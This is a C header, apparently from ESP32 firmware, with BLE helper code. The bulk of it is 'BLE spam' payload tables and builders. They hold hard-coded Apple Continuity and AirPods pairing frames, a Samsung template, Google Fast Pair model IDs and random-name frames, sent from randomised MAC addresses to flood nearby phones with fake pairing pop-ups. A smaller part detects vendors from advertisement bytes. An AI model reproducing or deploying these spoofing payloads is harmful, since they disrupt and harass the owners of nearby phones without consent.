#pragma once
/*
 * ble_common.h - Shared BLE utilities: PRNG, random MAC, vendor detection.
 */
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include "bs/bs_ble.h"

/* ── LCG PRNG ───────────────────────────────────────────────────────────── */

static inline void ble_prng_seed(uint32_t* state, uint32_t seed) {
    *state = seed ? seed : 0xDEADBEEFu;
}

static inline uint32_t ble_lcg_next(uint32_t* state) {
    *state = *state * 1664525u + 1013904223u;
    return *state;
}

/* ── Random MAC (random static address: top 2 bits of byte[5] set) ──────── */

static inline void ble_random_addr(uint8_t addr[6], uint32_t* rng) {
    for (int i = 0; i < 6; i++)
        addr[i] = (uint8_t)(ble_lcg_next(rng) & 0xFF);
    addr[0] |= 0xC0;  /* random static: ESP32 treats addr[0] as MSB; bits 7+6 must be 11 */
}

/* ── Vendor detection from raw AD bytes ─────────────────────────────────── */

typedef enum {
    BLE_VENDOR_UNKNOWN   = 0,
    BLE_VENDOR_APPLE,
    BLE_VENDOR_SAMSUNG,
    BLE_VENDOR_GOOGLE,
    BLE_VENDOR_MICROSOFT,
} ble_vendor_t;

static inline const char* ble_vendor_str(ble_vendor_t v) {
    switch (v) {
        case BLE_VENDOR_APPLE:     return "Apple";
        case BLE_VENDOR_SAMSUNG:   return "Samsung";
        case BLE_VENDOR_GOOGLE:    return "Google";
        case BLE_VENDOR_MICROSOFT: return "Microsoft";
        default:                   return "???";
    }
}

/* ── BLE spam payload tables + builders (shared by ble_spam.c + headless) ── */

/* Apple Proximity Pair / Continuity — 31-byte long payloads */
static const uint8_t k_ble_ios_long[][31] = {
    {0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, /* AirPods     */
    {0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x0E,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, /* AirPods Pro */
    {0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x0A,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, /* AirPods Max */
    {0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, /* AirPods 3   */
};
#define BLE_IOS_LONG_COUNT  (int)(sizeof(k_ble_ios_long)  / sizeof(k_ble_ios_long[0]))

/* Apple Continuity — 25-byte short payloads */
static const uint8_t k_ble_ios_short[][25] = {
    {0x18,0xFF,0x4C,0x00,0x04,0x04,0x2A,0x00,0x00,0x00,0x0F,0x05,0xC1,0x09,0x60,0x4C,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00}, /* NumberSetup  */
    {0x18,0xFF,0x4C,0x00,0x04,0x04,0x2A,0x00,0x00,0x00,0x0F,0x05,0xC1,0x06,0x60,0x4C,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00}, /* AppleTV Pair */
};
#define BLE_IOS_SHORT_COUNT (int)(sizeof(k_ble_ios_short) / sizeof(k_ble_ios_short[0]))

/* Samsung BLE base — byte[14] randomised each cycle */
static const uint8_t k_ble_samsung_base[15] = {
    0x0E,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x00
};

/* Google Fast Pair model IDs (24-bit) */
static const uint32_t k_ble_google_models[] = {
    0x92BBBD, 0x000006, 0x821F66, 0xF52494, 0xD446A7,
    0xCD8256, 0x0000F0, 0x0E30C3, 0x718FA4, 0x0003F0,
};
#define BLE_GOOGLE_MODEL_COUNT (int)(sizeof(k_ble_google_models)/sizeof(k_ble_google_models[0]))

static const uint8_t k_ble_google_tmpl[17] = {
    0x10,0x16,0x2C,0xFE,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

static const char k_ble_alphanum[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ";
#define BLE_ALPHANUM_LEN 63

typedef enum { BLE_SPAM_APPLE=0, BLE_SPAM_SAMSUNG, BLE_SPAM_GOOGLE,
               BLE_SPAM_NAME, BLE_SPAM_ALL, BLE_SPAM_MODE_COUNT } ble_spam_mode_t;

static const char* const k_ble_spam_mode_names[] = {
    "Apple", "Samsung", "Google", "Name", "All"
};

static inline void ble_build_apple(bs_ble_adv_data_t* out, uint32_t* rng) {
    memset(out, 0, sizeof(*out));
    if (ble_lcg_next(rng) & 1) {
        int idx = (int)(ble_lcg_next(rng) % (uint32_t)BLE_IOS_LONG_COUNT);
        memcpy(out->data, k_ble_ios_long[idx], 31); out->len = 31;
    } else {
        int idx = (int)(ble_lcg_next(rng) % (uint32_t)BLE_IOS_SHORT_COUNT);
        memcpy(out->data, k_ble_ios_short[idx], 25); out->len = 25;
    }
}

static inline void ble_build_samsung(bs_ble_adv_data_t* out, uint32_t* rng) {
    memset(out, 0, sizeof(*out));
    memcpy(out->data, k_ble_samsung_base, 15);
    out->data[14] = (uint8_t)(ble_lcg_next(rng) & 0xFF);
    out->len = 15;
}

static inline void ble_build_google(bs_ble_adv_data_t* out, uint32_t* rng) {
    memset(out, 0, sizeof(*out));
    int idx = (int)(ble_lcg_next(rng) % (uint32_t)BLE_GOOGLE_MODEL_COUNT);
    uint32_t m = k_ble_google_models[idx];
    memcpy(out->data, k_ble_google_tmpl, 17);
    out->data[13] = (uint8_t)((m >> 16) & 0xFF);
    out->data[14] = (uint8_t)((m >>  8) & 0xFF);
    out->data[15] = (uint8_t)( m        & 0xFF);
    out->len = 17;
}

static inline void ble_build_name(bs_ble_adv_data_t* out, uint32_t* rng) {
    memset(out, 0, sizeof(*out));
    uint8_t nl = (uint8_t)(4 + (ble_lcg_next(rng) % 11));
    out->data[0] = 0x02; out->data[1] = 0x01; out->data[2] = 0x06;
    out->data[3] = nl + 1; out->data[4] = 0x09;
    for (uint8_t i = 0; i < nl; i++)
        out->data[5+i] = (uint8_t)k_ble_alphanum[ble_lcg_next(rng) % BLE_ALPHANUM_LEN];
    out->len = (uint8_t)(nl + 5);
}

static inline void ble_build_payload(bs_ble_adv_data_t* out,
                                      ble_spam_mode_t mode, uint32_t* rng) {
    ble_spam_mode_t eff = mode;
    if (mode == BLE_SPAM_ALL)
        eff = (ble_spam_mode_t)(ble_lcg_next(rng) % (uint32_t)(BLE_SPAM_MODE_COUNT - 1));
    switch (eff) {
        case BLE_SPAM_APPLE:   ble_build_apple(out, rng);   break;
        case BLE_SPAM_SAMSUNG: ble_build_samsung(out, rng); break;
        case BLE_SPAM_GOOGLE:  ble_build_google(out, rng);  break;
        case BLE_SPAM_NAME:    ble_build_name(out, rng);    break;
        default:               ble_build_apple(out, rng);   break;
    }
}

/*
 * Walk the AD records in data[0..len-1] and return the first matched vendor.
 * Checks: type 0xFF (manufacturer-specific) for Apple/Samsung/Microsoft;
 *         type 0x03/0x16 (16-bit UUID) for Google Fast Pair (0xFE2C).
 */
static inline ble_vendor_t ble_detect_vendor(const uint8_t* data, uint8_t len) {
    uint8_t i = 0;
    while (i < len) {
        uint8_t ad_len = data[i];
        if (ad_len == 0 || (i + ad_len) >= len) break;
        uint8_t ad_type        = data[i + 1];
        const uint8_t* ad_data = data + i + 2;
        uint8_t ad_dlen        = ad_len - 1;

        if (ad_type == 0xFF && ad_dlen >= 2) {
            uint16_t mfr = (uint16_t)(ad_data[0] | ((uint16_t)ad_data[1] << 8));
            if (mfr == 0x004C) return BLE_VENDOR_APPLE;
            if (mfr == 0x0075) return BLE_VENDOR_SAMSUNG;
            if (mfr == 0x0006) return BLE_VENDOR_MICROSOFT;
        }
        if ((ad_type == 0x03 || ad_type == 0x16) && ad_dlen >= 2) {
            uint16_t uuid = (uint16_t)(ad_data[0] | ((uint16_t)ad_data[1] << 8));
            if (uuid == 0xFE2C) return BLE_VENDOR_GOOGLE;
        }
        i += ad_len + 1;
    }
    return BLE_VENDOR_UNKNOWN;
}
